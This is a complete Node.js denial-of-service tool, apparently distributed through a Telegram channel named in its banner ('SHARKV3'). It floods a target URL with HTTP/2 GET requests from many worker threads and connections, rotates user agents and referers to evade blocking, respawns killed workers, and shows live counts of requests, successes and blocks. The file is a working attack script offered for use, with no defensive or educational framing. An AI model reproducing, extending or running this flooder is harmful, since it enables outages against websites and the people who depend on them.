const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');
const fs = require('fs');

const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const referers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://duckduckgo.com/',
    'https://www.facebook.com/',
    'https://www.reddit.com/',
];

const CPU_COUNT = cpus().length;
const THREADS = CPU_COUNT * 2;
const INITIAL_CONNECTIONS = 45;
const POWER_MULTIPLIER = 4;
const MAX_INFLIGHT = 4000;
const LIVE_REFRESH_RATE = 1100;
const WARMUP_TIME = 10000;

const DYNAMIC_PORT = Math.floor(Math.random() * 1000) + 9000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let vanishedCount = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    const endTime = Date.now() + duration * 1000;

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`PORT: ${DYNAMIC_PORT} | CPUx${CPU_COUNT} Threads`);
    console.log(`WARMUP IN PROGRESS...`);

    const workers = [];

    function spawnWorker(data) {
        const w = new Worker(__filename, { workerData: data });
        w.on('exit', code => {
            if (Date.now() < endTime) {
                console.log(`[ANTI-KILL] Worker died. Respawning...`);
                spawnWorker(data);
            }
        });
        workers.push(w);
    }

    setTimeout(() => {
        console.clear();
        console.log(`SHARKV3 - FULL THROTTLE | PORT ${DYNAMIC_PORT}`);

        for (let i = 0; i < THREADS; i++) {
            spawnWorker({ target, duration, initial: true, port: DYNAMIC_PORT });
        }

        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            spawnWorker({ target, duration, initial: false, port: DYNAMIC_PORT });
        }
    }, WARMUP_TIME);

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
        console.log(`Vape: ${vanishedCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
            else if (msg === 'vanish') vanishedCount++;
        });
    });
    server.listen(DYNAMIC_PORT);
} else {
    const { target, duration, initial, port } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;
    const socket = net.connect(port, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > end || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const headers = {
                    ':method': 'GET',
                    ':path': '/',
                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'referer': referers[Math.floor(Math.random() * referers.length)]
                };
                const req = client.request(headers);

                let sent = false;
                req.setEncoding('utf8');
                req.on('response', () => {
                    sent = true;
                    inflight.count--;
                    sendStat('ok');
                });
                req.on('data', () => {}); // consume
                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });
                req.on('close', () => {
                    if (!sent) {
                        inflight.count--;
                        sendStat('vanish');
                    }
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), Math.random() * 5); // tiny jitter helps delivery
    }

    function createConnection() {
        if (Date.now() > end) return;

        let client;
        try {
            client = http2.connect(target);

            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 100);
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 100));

            client.on('connect', () => {
                for (let i = 0; i < 150; i++) sendLoop(client, inflight);
            });
        } catch {
            setTimeout(createConnection, 100);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
